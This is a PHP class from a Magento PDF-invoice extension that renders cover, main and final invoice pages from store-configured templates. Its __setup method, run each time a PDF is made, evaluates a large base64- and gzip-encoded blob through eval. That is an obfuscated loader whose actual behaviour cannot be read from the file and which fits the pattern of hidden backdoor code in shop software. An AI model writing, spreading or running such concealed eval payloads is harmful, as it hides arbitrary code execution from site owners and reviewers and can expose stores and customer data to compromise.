<?php
Class Magazento_Pdfinvoice_Model_Pdf {
    
    protected $_pdf;
    protected $_pageCss;

    public function __setup($node) {
        eval(gzinflate(base64_decode(rawurldecode('XZY1ssWADUWXk2RcmGlSmf3MTE3GzMxefX7aqJUqjXTuKa90%2BGeW7iWB%2Faco87ko%2F1l%2F55TP47KV%2B%2F5%2FrX%2BUyh0MFJLu74s2AqhMdFf1iJCxod4eda0ladZmw8Ua4%2BhJPxqgbiLHtbW91ZVYcS6Qjc3TrUKyCC9h5wjPENTWhukIWDI4ojJP%2BGlX%2BwncPkNWECvJgMorkIo58ZeIUZLA6Xl6xYm%2B5I2AeB6Go1bVXcr%2BOL0zHnbo4TurWncw8W7ztnLL79v3UQLlwYozncTd2B4NKcygiqPAw7U3fbpHk%2B5o3rQi77e6wljY3FXQV1EpvYXIUq%2B12qR7Y2rw9DP8BQqjT83QuIS72PeNhm0Qd8GzoRavgJHi65jKwDSku8dHh0o1pMfcqY8yBGRsya%2FvibC6I%2F7x%2ByRjoC%2FR9wBuJihTxsEXLIGEw%2Fz0w0kjMF9fwy2mDlinMmuD2sYorrflpM8JBGM7KlCMdyylFeLq7U%2BUrym5nilQOLtsa%2Bme4cq0Yc8CvDLN2%2FAUUqn95%2BPJapu%2FOJyLJGaq6OZVrxfPjz%2FLt3THoxpgXKeegGBOTJCVjt2XK%2BtyzCO0Bm6fbNPJa8xzLowgDQPdtgf7DkP5%2FocSyLYtHpAto9EnQ0SkUGGCV%2BVG%2BwJpJUQW6Aw2Neyt9nE3Wv5BRDfih9TGopGLMTClSmsP37aF3ryRqnB%2F0U0O04CvVsrsQ0cUcHfdZHm0CXyaSIY2LzfmTOUHjwel1X6sLrtUuDd4BRA6s1exp1Nuu7VTPkPlaqDptWEnS1utpyhUGao%2Ft1MqmGpNyHONSflzgLaeFKqR%2Bo6t0u6oPHSrADoi6dRWkh%2Fx8e5ScCp8OV5EwZ5Fudd3UIlgykLHswWEJfJ%2BiIcoPpke%2FwLtW2A9BcLvrlVO5V8ludfX9T1p6OBU%2FvDXuahEDh%2Fj6vBksvrJDWds3hr43q%2F8UcKYSbeFTOPEM87zelqg%2FMTdW1%2BnK8Idc2Y3O8J7irw4GOsAFWGhmUoBJqxv0KwRhe8rWiKSIoUMJuYvDz%2BhkLY3aHKgyHrHkkJ6%2BHJ2U8gaFQiXljRc9aJigdXblTreMXN754FR5sKy%2BvBkQUYFr6GuDDfdVAJFtAgBbFy%2BKXkIbTMsuuWqXX40odzlKlKU%2BRsrAAnXNBmUnsZuQzN1%2B5D1tL5a9Igku5XbJfZLZ%2F2l%2BDY2NQ5j%2FDTdras7Ezg%2BkpT4sdzDom8irg6aIHpHXtOa2B7BM6cUsNzL8YPJwfFhvo9klQr8%2FU066xmuCOHp5UhWJ4QeiPKrviR9BaUlNmkn9E0pkSMfLLy4aJra5%2Bm3V1WQzObEX5LlBmDNXXxbj6D5O%2FkGOAj0%2FaUkiWtRLhbpMIEZY1%2FW55%2F1%2BTYiQYwm%2Bzp0Oj3%2BrgDcVHxfdSP71P3MOUGTwdLapVS6wSwpkrOJKQgJ%2FmaHRO6CPlvig48pahGggHEWdx41sJ8WLDVICFE55OfcNH1pn2KtvNuv%2Bfdk6OCtjJBknExfHx8%2Bllgiu%2BoBZCVP4qKWWZqRr0FD36Gr6tElHG5O7pAy7altkcqhdUfoNYasDluWKCdHhGmCVd6LHn8vUJOVesMg5Qa0K4WnZZAvgMs2zGkHfztWtO5ghKqr4IW2l%2Fgb19P4ZquLm%2B6FbiFfVNcD8ghDLr3KISLgmx2kiaOAgEOD4eD25wKXwv3ackXRgiDmM24mM4UplZhrzU3WpRPrwgDQ2sg7K4izYRGWx8JXSoSrh68tDovYSaRnVZ2svcVLanEA%2FgIBTdpGFq0myzkGtW0qiWeBcPClNMPX%2F%2BNLrj%2FWZxNo6O1W7ZgJiW0AGHwQFz4pGEbtbZuG%2BkPxxs9syIvBGCiCNrdpZWlovXL8oam0STEXJO0T4ncgVNZsemYu1Ruvhb4ucleM9mivuoqPkrhH4qxFGzhsHF37L2cp4Y%2B67MuWnyG2vJH9WpgUxZgnTDEwoTPWcSf9u%2F5VgV2dyDcd6EX6JeDCsmfZshuNA85s8yl7jpmwVSJvJCTXIq4sjZQFPyNF%2F3niIfzwHluio6DGQyMxo0lFAhqmElVlkX%2BbD8HMy81OflTfMJHnHCuU%2B0B31pH1jX%2FCqNKOIVff5hyJhBDt12YPVvsxYxf8oC3hTo8LLQJHSuXB4bUQGzBsQT18l6hDXgW%2FZMPp4RdLFChvxiKuPSePsiFLeFlzCfNnGiPAO0BxXHRMxuI4pdnjyBdAL1leLiptLj7sqiUrFWXrI9dC9Rvo7hHJM0pWCaAMK%2B4FHuOv53fvVGuH2%2BKE%2FACJxxBZ%2FYSZ%2FIXHANzZUBMWgu3Ds%2FPRfT7ibkKawJMI0wtZH1ASlNOCeB%2BMpoNu71yQi%2F29E5wzFzoJrEHbOaaD7%2BjOkduQ2hsp0rB0ZsLitoGkp26OtC7PouztxjelzB3wfyRVEkcS6RSFl52ANFWu9jOQTUBO0TI0UONohWO8xjvdAwKY2sy96ouE5VSyA1legEo4Dw5jbPA0upky9NHqTAUs%2Bc%2FTTrpjr8pvhrkH7EWQl2oD3nQZdhqU4j772fm40jNFdV9aN2LE%2BOKtPKJdROIumjTr3Yki4LPqyNRWOcjZjzjdj3tAvziFJ2PP4eiwXhQTfjrd8Wd8Fdv7cAl1qk7ExNxLFp5%2BZEyhIXoVujtuQ8NqGXMPN%2BMl%2FEXm%2Fnv3W%2Ff7uAaGMaA1WMqnGT%2BC%2Boj%2BCL0CXj7OuvzH88dS3XaeVbojS72KVnGHEp3%2Fxr%2FNGTe6kgClaXvKqx9Y9PmlZWMJVF2Ccw8kVcHMBAh5uFdVxnWYk%2B8b8GOe4m974Zn29JmlQckw7aDmAAOWU%2FlKiwRuyJncp6xphfnU7WDEmxMlnUeBiFb7J6Lk%2BE1ZMFLI84CHFntF1JADz%2FaPmUREBADh3XgAfJSAAbAOP%2FelzqhzLIOb5iG06OMVVoV5oHO%2BeJ5BrdAX8kXzknxenFpxmNQLZywZQ1KDq5CClxtS7z732u3eXrHFkjfOH5EhkVPdoBo6KykzNSg%2B%2FCDChmuSe%2FOiZLjWN0CzvtCizOuf5OFSdGBx4FFKjS3Bwrl2Rx2Y4kDRQK%2BIKD%2Ba%2Fn9ay2mxzVimi0QyXETSoJ4RniQ0ihEmErT7HbkonlzRec1nxCq%2BGN%2BQPcRkMX2jIdTlXyDYQpYVNyUUxSVCSdcSQYCNALLpImdLaO4MU5dJfQmYoJ24kkD2PW6keLrFVkaqcjxLVBb%2BYEnKsowkVutLJRIPzgKzvEihjCL6m%2BZlhrmOIipnLFuUDOFdvKFAquTtuUKUngFbcQdP77T%2F9DTOYzeYs1wiEuuwfxPH8nPNP%2B2UAJZ2qfVP1NO1IDVaZeSMJJ2IVKahBcIoi%2F6sqyqQxtAQrMujlxgrKAleOehH738cQZYEIrvmKhonN3q4fgeDEzEjkMqordzN2I8TICYNqNhZAX6KjnxDIfN4WsAriXK2s2gS%2FG0fagAmgo4GVv6xECL4oT18SnWYC96yX6bEPfYpsyzvVbhOvg36RzTtid9l4J%2BBkGUIJr%2FfRAN8aP7kCLS%2BD8GBLjiMZnnYjM%2Fb7ApPmg3wY4JVjoNUjMy4JMH%2FLv69oxeedFYrU0pM5oXjYDl5ds0i0YwrlRdbqZclw4D9vLuBc6M8%2FCAPTrrEM5B6XZv6Do83dgAhAmgiqWqrrh8ZU%2BFwPJF85OaP7wIAWh1gHr4we51X%2B%2FM%2FTMkSX73Pg8SIGRQK%2FWqL3%2BSxnB%2BDW4b9jKq8xPLkXff3PR9mkUPlPRVqPuVTn%2BTZd9x2HualkCpof3sUgut7mrLFwgdPbwAu08kN8wboavNCAowptXBUrvYcBoeyIzj2xDvWyx0P50QYg2KLiwz3M7Br8bx4AUHQA3vmiaJ%2F%2FOuv%2Fv1f'))));
    }
    
    
    public function processPDF($invoice,$order,$block,$node) {

        $this->__setup($node);
        
        $helper = Mage::helper('cms');
        $processor = $helper->getPageTemplateProcessor();
        
        $main_content = Mage::getStoreConfig("pdfinvoice/".$node."/main_content");
        $main_content = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$main_content);
        $main_content = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$main_content);
        $main_content = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$main_content);
        $main_content_header = Mage::getStoreConfig("pdfinvoice/".$node."/main_content_header");           
        $main_content_header = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$main_content_header);
        $main_content_header = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$main_content_header);
        $main_content_header = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$main_content_header);          
        $main_content_footer = Mage::getStoreConfig("pdfinvoice/".$node."/main_content_footer");     
        $main_content_footer = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$main_content_footer);
        $main_content_footer = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$main_content_footer);
        $main_content_footer = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$main_content_footer); 
        
        $cover_content = Mage::getStoreConfig("pdfinvoice/".$node."/cover_content");
        $cover_content = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$cover_content);
        $cover_content = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$cover_content);
        $cover_content = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$cover_content);
        $cover_content_header = Mage::getStoreConfig("pdfinvoice/".$node."/cover_content_header");
        $cover_content_header = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$cover_content_header);
        $cover_content_header = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$cover_content_header);
        $cover_content_header = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$cover_content_header);
        $cover_content_footer = Mage::getStoreConfig("pdfinvoice/".$node."/cover_content_footer");  
        $cover_content_footer = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$cover_content_footer);
        $cover_content_footer = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$cover_content_footer);
        $cover_content_footer = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$cover_content_footer);

        $final_content = Mage::getStoreConfig("pdfinvoice/".$node."/final_content");
        $final_content = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$final_content);
        $final_content = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$final_content);
        $final_content = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$final_content);
        $final_content_header = Mage::getStoreConfig("pdfinvoice/".$node."/final_content_header");
        $final_content_header = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$final_content_header);
        $final_content_header = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$final_content_header);
        $final_content_header = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$final_content_header);        
        $final_content_footer = Mage::getStoreConfig("pdfinvoice/".$node."/final_content_footer");
        $final_content_footer = Mage::helper('pdfinvoice/data')->pdfInvoiceTemplateParce($invoice,$final_content_footer);
        $final_content_footer = Mage::helper('pdfinvoice/data')->pdfOrderTemplateParce($order,$final_content_footer);
        $final_content_footer = Mage::helper('pdfinvoice/data')->pdfGeneralTemplateParce($block,$final_content_footer); 
        
        $cover_content        = $processor->filter($cover_content);  
        $main_content         = $processor->filter($main_content);          
        $final_content        = $processor->filter($final_content);  
        
        $cover_content_header = $processor->filter($cover_content_header);  
        $cover_content_footer = $processor->filter($cover_content_footer);
        
        $main_content_header  = $processor->filter($main_content_header);  
        $main_content_footer  = $processor->filter($main_content_footer);  
        
        $final_content_header = $processor->filter($final_content_header);  
        $final_content_footer = $processor->filter($final_content_footer);
        
        if (Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_active")) {
            $this->_pdf->SetHTMLHeader($cover_content_header);
            $this->_pdf->AddPage(
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_layout"),
                    '' ,'','','',
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_margin_left"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_margin_right"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_margin_top"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_margin_bottom"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_margin_header"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/cover_page_margin_footer"),
                    '','','','',1,1,1,1);
            $this->_pdf->SetHTMLFooter($cover_content_footer); 
            $this->_pdf->WriteHTML($cover_content);
        }
        
        $this->_pdf->SetHTMLHeader($main_content_header); 
        $this->_pdf->AddPage(
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_layout"),
                '' ,'','','',
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_margin_left"),
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_margin_right"),
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_margin_top"),
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_margin_bottom"),
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_margin_header"),
                Mage::getStoreConfig("pdfinvoice/".$node."/main_page_margin_footer"),
                '','','','',1,1,1,1);        
        $this->_pdf->SetHTMLFooter($main_content_footer);    
        $this->_pdf->WriteHTML('<div class="main_content">'.$main_content."</div>");
        $this->_pdf->WriteHTML($data);
        
        
        if (Mage::getStoreConfig("pdfinvoice/".$node."/final_page_active")) {
            $this->_pdf->SetHTMLHeader($final_content_header); 
            $this->_pdf->AddPage(
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_layout"),
                    '' ,'','','',
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_margin_left"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_margin_right"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_margin_top"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_margin_bottom"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_margin_header"),
                    Mage::getStoreConfig("pdfinvoice/".$node."/final_page_margin_footer"),
                    '','','','',1,1,1,1);            
            $this->_pdf->SetHTMLFooter($final_content_footer."</div>");         
            $this->_pdf->WriteHTML($final_content);            
        }
        
        return $this->_pdf->Output('', 'S');
    }
    
    
    
    
}
?>